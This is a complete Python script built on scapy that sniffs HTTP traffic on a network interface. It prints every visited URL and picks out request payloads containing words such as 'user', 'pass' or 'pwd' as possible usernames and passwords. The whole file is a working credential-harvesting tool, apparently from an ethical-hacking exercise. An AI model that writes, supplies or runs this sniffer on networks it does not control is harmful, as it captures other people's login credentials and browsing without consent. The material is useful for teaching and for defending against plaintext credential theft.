#! /usr/bin/env python
# packet_sniffer.py - packet sniffer that catches HTTP packets and filters out
# all URLs visited and payloads associated with login information.
# WARNING: Not compatible with Python 2.7

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "usr", "name", "login", "mail",
                    "password", "pass", "pwd"]
        if any(keyword in str(load).lower() for keyword in keywords):
            return load


def print_info_frame(message_string, frame_symbol="−"):
    length = len(message_string)
    print("\n" + " INFO ".center(length, frame_symbol))
    print(message_string)
    print("".center(length, frame_symbol) + "\n")


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login_info(packet)
        if login_info:
            print_info_frame(f"[+] Possible username/password >> {login_info}")


print("Sniffing has been started.")
sniff("eth0")
